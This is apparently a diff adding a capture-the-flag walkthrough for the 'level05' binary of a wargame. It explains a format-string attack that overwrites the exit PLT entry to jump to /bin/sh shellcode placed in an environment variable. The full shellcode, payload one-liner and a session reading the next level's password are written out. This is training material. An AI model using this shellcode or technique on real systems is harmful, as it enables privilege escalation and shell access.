@@ -1,0 +1,17 @@
+
+The binary read input from stdin, and print out the same string after applying a "tolower" on the string.
+The buffer is printed with printf, so we will do a string format attack in order to rewrite the function address stored in the exit plt function.
+This address is store at the address 0x80497e0. We will store instead a ptr to a shellcode stored in the environment:
+export SHELLCODE=`python -c "print 128 * '\x90' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
+(the address of this variable is retrieved by calling getenv() in a separate program).
+
+the final payload will be generated this way:
+python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55381x' + '%10\$n' + '%10146x' + '%11\$n'"
+
+level05@OverRide:~$ (python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55381x' + '%10\$n' + '%10146x' + '%11\$n'" ; cat) | ./level05
+[...]
+whoami
+level06
+cd ../level06
+cat .pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
